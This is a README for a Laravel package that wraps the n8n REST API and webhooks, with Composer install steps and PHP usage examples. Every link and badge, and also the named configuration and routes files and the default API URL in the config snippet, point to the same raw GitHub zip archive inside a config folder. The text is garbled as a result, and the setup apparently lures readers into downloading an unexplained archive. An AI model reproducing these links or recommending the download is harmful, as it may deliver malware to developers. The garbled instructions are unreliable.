# Laravel N8N: A Fluent Client for n8n Automation Workflows

![Laravel N8N](https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip%https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip)
![GitHub Releases](https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip%https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip)

[![Check Releases](https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip%20Releases-Click%https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip)](https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip)

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [API Documentation](#api-documentation)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)
- [Support](#support)

## Overview

Laravel N8N is a complete, expressive, and fluent Laravel client designed for the n8n public REST API and Webhooks Triggering. This package allows you to automate your workflows seamlessly within your Laravel application. With Laravel N8N, you can integrate various services, trigger workflows, and manage your automation tasks efficiently.

## Features

- **Fluent Interface**: Enjoy a clean and intuitive API that allows for easy interaction with n8n.
- **Webhook Support**: Trigger workflows through webhooks directly from your Laravel application.
- **Automation**: Streamline your processes by automating repetitive tasks and integrating various services.
- **Error Handling**: Built-in error handling to ensure your workflows run smoothly.
- **Extensive Documentation**: Comprehensive guides and examples to help you get started quickly.

## Installation

To install Laravel N8N, you can use Composer. Run the following command in your terminal:

```bash
composer require yoanhuke/laravel-n8n
```

Once installed, publish the configuration file using:

```bash
php artisan vendor:publish --provider="Yoanhuke\LaravelN8N\LaravelN8NServiceProvider"
```

You can now configure your n8n API credentials in the `https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip` file.

## Usage

### Configuration

Before using Laravel N8N, make sure to set your n8n API credentials in the configuration file. Open `https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip` and add your API key and endpoint.

```php
return [
    'api_key' => env('N8N_API_KEY'),
    'api_url' => env('N8N_API_URL', 'https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip'),
];
```

### Basic Example

Here’s a simple example of how to trigger a workflow:

```php
use Yoanhuke\LaravelN8N\Facades\N8N;

$response = N8N::trigger('your-workflow-id', [
    'data' => [
        'key' => 'value',
    ],
]);

if ($response->successful()) {
    echo "Workflow triggered successfully!";
} else {
    echo "Failed to trigger workflow.";
}
```

### Webhook Example

To handle webhooks, you can define a route in your `https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip` file:

```php
Route::post('/webhook/n8n', function () {
    $data = request()->all();
    
    // Process the incoming data
    // ...

    return response()->json(['status' => 'success']);
});
```

Then, configure your n8n workflow to call this webhook URL whenever the event occurs.

## API Documentation

The Laravel N8N package provides a set of methods to interact with the n8n API. Below are some key methods:

### Trigger Workflow

```php
N8N::trigger($workflowId, $data);
```

- **$workflowId**: The ID of the workflow to trigger.
- **$data**: An array of data to send to the workflow.

### Get Workflow

```php
N8N::getWorkflow($workflowId);
```

- **$workflowId**: The ID of the workflow to retrieve.

### List Workflows

```php
N8N::listWorkflows();
```

- Returns a list of all workflows.

### Delete Workflow

```php
N8N::deleteWorkflow($workflowId);
```

- **$workflowId**: The ID of the workflow to delete.

## Examples

### Automating Email Notifications

You can use Laravel N8N to automate email notifications. Here’s how:

1. Create a workflow in n8n that sends an email.
2. Trigger this workflow from your Laravel application when a user registers.

```php
N8N::trigger('email-notification-workflow', [
    'email' => $user->email,
]);
```

### Data Sync Between Services

If you need to sync data between two services, you can set up a workflow in n8n that handles this. Trigger it from Laravel when necessary.

```php
N8N::trigger('data-sync-workflow', [
    'data' => $dataToSync,
]);
```

## Contributing

We welcome contributions to Laravel N8N. To contribute:

1. Fork the repository.
2. Create a new branch for your feature or fix.
3. Make your changes and commit them.
4. Push your branch and submit a pull request.

Please ensure your code adheres to the coding standards used in the project.

## License

Laravel N8N is open-source software licensed under the MIT License. You can freely use, modify, and distribute it as per the terms of the license.

## Support

For support, please check the [Releases](https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip) section for the latest updates and fixes. If you encounter any issues, feel free to open an issue in the repository.

---

For more information, visit the [Releases](https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip) section.